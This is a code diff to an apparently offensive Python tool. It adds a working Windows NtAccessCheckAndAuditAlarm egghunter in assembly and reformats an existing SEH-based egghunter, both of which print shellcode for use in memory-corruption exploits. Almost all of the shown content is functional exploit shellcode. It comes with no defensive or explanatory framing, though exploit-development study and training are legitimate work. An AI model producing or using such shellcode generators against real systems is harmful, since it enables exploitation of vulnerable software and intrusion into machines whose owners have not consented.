@@ -32,35 +32,63 @@ def print_shellcode(code):
     shellcode = ""
     for dec in encoding: 
         shellcode += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
-    console.print("[INFO] buf = (\"" + shellcode + "\")")
+    console.print(f"[INFO] Generated shellcode ({len(shellcode)} bytes):"
+                  "\nbuf = (\"" + shellcode + "\")")
+
+def generate_egghunter_ntaccess(tag):
+    egg_hunter = f'''
+        loop_inc_page:			 
+            or dx, 0x0fff		                ; 
+        loop_inc_one:			 
+            inc edx				                ;
+        loop_check:				 
+            push edx			                ;
+            mov eax, 0xfffffe3a                 ;
+            neg eax				                ;
+            int 0x2e			                ;
+            cmp al,05			                ;
+            pop edx				                ;
+        loop_check_valid:		 
+            je loop_inc_page	                ;
+        is_egg:					 
+            mov eax, {tag_to_hex(tag)}	        ;
+            mov edi, edx		                ;
+            scasd				                ;
+            jnz loop_inc_one	                ;
+            scasd				                ;
+            jnz loop_inc_one	                ;
+        matched:				 
+            jmp edi				                ;
+    '''
+    print_shellcode(egg_hunter)
 
 def generate_egghunter_seh(tag):
     egg_hunter = f'''
         start: 									 
-            jmp get_seh_address 				;
+            jmp get_seh_addr     		        ;
         build_exception_record: 				
-            pop ecx 							;
-            mov eax, {tag_to_hex(tag)} 	;
-            push ecx 							;
-            push 0xffffffff 					;
-            xor ebx, ebx 						;
-            mov dword ptr fs:[ebx], esp 		;
-            sub ecx, 0x04						;
-            add ebx, 0x04						;
-            mov dword ptr fs:[ebx], ecx			;
+            pop ecx 					        ;
+            mov eax, {tag_to_hex(tag)} 	        ;
+            push ecx 					        ;
+            push 0xffffffff 			        ;
+            xor ebx, ebx 				        ;
+            mov dword ptr fs:[ebx], esp         ;
+            sub ecx, 0x04				        ;
+            add ebx, 0x04				        ;
+            mov dword ptr fs:[ebx], ecx	        ;
         is_egg: 								
-            push 0x02 							;
-            pop ecx 							;
-            mov edi, ebx 						;
-            repe scasd 							;
-            jnz loop_inc_one 					;
-            jmp edi 							;
+            push 0x02 					        ;
+            pop ecx 					        ;
+            mov edi, ebx 				        ;
+            repe scasd 					        ;
+            jnz loop_inc_one 			        ;
+            jmp edi 					        ;
         loop_inc_page: 							 
-            or bx, 0xfff 						;
+            or bx, 0xfff 				        ;
         loop_inc_one: 							 
-            inc ebx 							;
-            jmp is_egg 							;
-        get_seh_address: 						
+            inc ebx 					        ;
+            jmp is_egg 					        ;
+        get_seh_addr: 						
             call build_exception_record 		;
             push 0x0c 							;
             pop ecx 							;
@@ -74,9 +102,6 @@ def generate_egghunter_seh(tag):
             ret 								; 
     '''
     print_shellcode(egg_hunter)
-
-def generate_egghunter_ntaccess(tag):
-    pass
 
 def main(args):
     console.print(BANNER)
@@ -108,7 +133,7 @@ if __name__ == '__main__':
     exclusive_group = parser.add_mutually_exclusive_group()
     exclusive_group.add_argument(
         '--egghunter',
-        help = "Generate a 32-bit Windows SEH or NtAccess egghunter",
+        help = "Generate a 32-bit Windows SEH or NtAccessCheckAndAuditAlarm egghunter",
         action = 'store',
         type = str,
         nargs = 1,
